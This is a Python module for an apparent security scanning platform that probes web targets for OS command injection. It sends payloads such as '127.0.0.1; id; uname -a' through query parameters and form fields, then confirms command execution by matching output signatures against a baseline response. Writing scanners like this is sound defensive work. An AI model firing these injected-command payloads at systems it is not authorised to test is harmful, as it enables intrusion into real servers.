"""
OS Command Injection Probe (Architecture §5.2, §17 — evidence-based validation).

A real arsenal module closing the platform's command-injection coverage gap.
It delivers non-destructive command-separator payloads across query AND body
vectors, then confirms via deterministic command-output signatures combined with
a differential vs the baseline response (>= 2 independent signals, never a bare
substring match).
"""

from __future__ import annotations

import re
import urllib.parse

from backend.core.base import BaseArsenalModule
from backend.core.protocol import JobPacket, TaskTarget, Vulnerability

# Non-destructive proof commands. Separators cover Linux + Windows shells; the
# commands are read-only identity/echo probes (no state change), per §9 safety.
_SEPARATORS = (";", "&&", "|", "%0a", "&")
_PROBE_CMDS = ("id", "uname -a", "whoami", "echo VIGIL$((7*7))ECHO")

# Deterministic command-output signatures (proof a shell actually ran).
_CMD_OUTPUT_MARKERS = (
    re.compile(r"uid=\d+\([a-z_][a-z0-9_-]*\)"),  # id (Linux)
    re.compile(r"Linux \S+ \S+"),  # uname -a (Linux)
    re.compile(r"VIGIL49ECHO"),  # echo $((7*7)) arithmetic
    re.compile(r"(?i)\b[a-z]:\\\\(windows|users)\b"),  # Windows path echo
    re.compile(r"(?i)\bnt authority\\\\system\b"),  # Windows whoami
)


class CommandInjectionProbe(BaseArsenalModule):
    def __init__(self):
        super().__init__()
        self.name = "OS Command Injection Probe"

    def _inject_query(self, url: str, headers: dict) -> list[TaskTarget]:
        targets: list[TaskTarget] = []
        if "?" not in url:
            return targets
        base, query = url.split("?", 1)
        params = urllib.parse.parse_qs(query, keep_blank_values=True)
        for param, values in params.items():
            base_val = values[0] if values else ""
            for sep in _SEPARATORS:
                for cmd in _PROBE_CMDS:
                    mutated = dict(params)
                    mutated[param] = [f"{base_val}{sep} {cmd}"]
                    targets.append(
                        TaskTarget(
                            url=f"{base}?{urllib.parse.urlencode(mutated, doseq=True)}",
                            method="GET",
                            headers=dict(headers),
                        )
                    )
        return targets

    async def generate_payloads(self, packet: JobPacket) -> list[TaskTarget]:
        url = packet.target.url
        headers = dict(packet.target.headers or {})
        targets: list[TaskTarget] = []

        # Baseline first (unmodified) so the analyzer can diff against it.
        targets.append(
            TaskTarget(url=url, method=packet.target.method or "GET", headers=headers, payload=packet.target.payload)
        )

        # Query-vector injection.
        targets.extend(self._inject_query(url, headers))

        # Body-vector injection (form fields) — covers DVWA's exec `ip` field
        # and generic command params. Sends application/x-www-form-urlencoded.
        body_fields = ("ip", "host", "cmd", "command", "address", "target", "domain")
        form_headers = dict(headers)
        form_headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
        seed = packet.target.payload if isinstance(packet.target.payload, dict) else {}
        for field in body_fields:
            for sep in _SEPARATORS[:3]:
                body = dict(seed)
                body[field] = f"127.0.0.1{sep} id; uname -a"
                body.setdefault("Submit", "Submit")
                targets.append(TaskTarget(url=url, method="POST", headers=form_headers, payload=body))
        return targets

    async def analyze_responses(
        self, interactions: list[tuple[TaskTarget, str]], packet: JobPacket
    ) -> list[Vulnerability]:
        """Confirm command injection: a command-output signature must appear AND
        the response must differ materially from the baseline (Architecture §17,
        >= 2 independent signals). Baseline is interaction[0]."""
        from backend.modules.evidence import differential

        vulns: list[Vulnerability] = []
        if not interactions:
            return vulns
        _baseline_target, baseline_text = interactions[0]
        baseline_text = baseline_text if isinstance(baseline_text, str) else ""

        seen: set[str] = set()
        for idx, (target, text) in enumerate(interactions):
            if idx == 0 or not isinstance(text, str) or not text:
                continue
            matched = next((p.pattern for p in _CMD_OUTPUT_MARKERS if p.search(text)), None)
            if not matched:
                continue
            # Signature alone could be reflected; require the baseline to NOT
            # carry it, i.e. the command output is genuinely new (differential).
            baseline_has = any(p.search(baseline_text) for p in _CMD_OUTPUT_MARKERS)
            ev = differential(baseline_text, text)
            confirmed = (not baseline_has) and (ev.signals >= 1 or ev.verified)
            key = f"{target.method}:{target.url}"
            if confirmed and key not in seen:
                seen.add(key)
                vector = "body" if target.method == "POST" else "query"
                vulns.append(
                    Vulnerability(
                        name="OS Command Injection",
                        severity="CRITICAL",
                        description=(
                            "Injected shell command output was reflected in the response, "
                            "proving server-side command execution."
                        ),
                        evidence=(
                            f"Target: {target.url} (vector={vector})\nCommand-output signature: {matched}; {ev.summary}"
                        ),
                        remediation=(
                            "Never pass user input to a shell. Use allowlists and native "
                            "language APIs; if a shell is unavoidable, use strict argument "
                            "escaping and parameterization."
                        ),
                    )
                )
                break  # one confirmed RCE is decisive
        return vulns
